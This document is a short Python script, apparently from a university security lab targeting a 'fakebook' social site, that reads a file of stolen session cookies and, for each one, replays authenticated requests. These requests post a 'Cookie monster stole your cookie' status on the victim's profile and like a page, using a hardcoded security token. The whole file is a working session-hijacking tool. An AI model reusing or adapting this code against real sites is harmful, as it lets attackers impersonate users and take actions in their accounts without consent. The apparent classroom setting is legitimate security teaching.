import sys
import requests
from pathlib import Path
from urllib.parse import quote


BASE_DIR = Path(__file__).parent.parent
COOKIE_FILE = BASE_DIR / 'server' / 'logged.txt'
DEFAULT_MESSAGE = 'Cookie monster stole your cookie.'


def main(cookie_file: Path, message: str):
    with open(cookie_file) as file:
        cookies = file.read()

    cookies = {cookie for cookie in cookies.split('\n') if cookie != ''}

    post_data = ('&core[ajax]=true&core[call]=user.updateStatus&core[security_token]=d4492e209'
                 f'9c22baa3d901a80a9722a5d&val[user_status]={quote(message)}&val[group_id]=&va'
                 'l[action]=upload_photo_via_share&image[]=&val[link][url]=http%3A%2F%2F&val[s'
                 'tatus_info]=&val[connection][facebook]=0&val[connection][twitter]=0&val[priv'
                 'acy]=0&core[is_admincp]=0&core[is_user_profile]=1&core[profile_user_id]=11')
    for cookie in cookies:
        requests.post(
            url='http://boura.fit.cvut.cz/fakebook/static/ajax.php',
            headers={
                'Accept': 'text/javascript, application/javascript, application/ecmascript, app'
                          'lication/x-ecmascript, */*; q=0.01',
                'Accept-Language': 'sk-SK,sk;q=0.9,cs;q=0.8,en-US;q=0.7,en;q=0.6',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookie,
                'Origin': 'http://boura.fit.cvut.cz',
                'Pragma': 'no-cache',
                'Referer': 'http://boura.fit.cvut.cz/fakebook/index.php?do=/profile-11/',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like '
                              'Gecko) Chrome/124.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            },
            data=post_data
        )

        requests.post(
            url='http://boura.fit.cvut.cz/fakebook/static/ajax.php',
            headers={
                'Accept': 'text/javascript, application/javascript, application/ecmascript, '
                          'application/x-ecmascript, */*; q=0.01',
                'Accept-Language': 'sk-SK,sk;q=0.9,cs;q=0.8,en-US;q=0.7,en;q=0.6',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookie,
                'Origin': 'http://boura.fit.cvut.cz',
                'Pragma': 'no-cache',
                'Referer': 'http://boura.fit.cvut.cz/fakebook/index.php?do=/pages/2/',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like '
                              'Gecko) Chrome/124.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            },
            data='&core[ajax]=true&core[call]=like.add&type_id=pages&item_id=2&core[secu'
                 'rity_token]=d4492e2099c22baa3d901a80a9722a5d&core[is_admincp]=0&core[i'
                 's_user_profile]=0&core[profile_user_id]=0'
        )


if __name__ == '__main__':
    msg = sys.argv[1] if len(sys.argv) >= 2 else DEFAULT_MESSAGE
    main(COOKIE_FILE, msg)
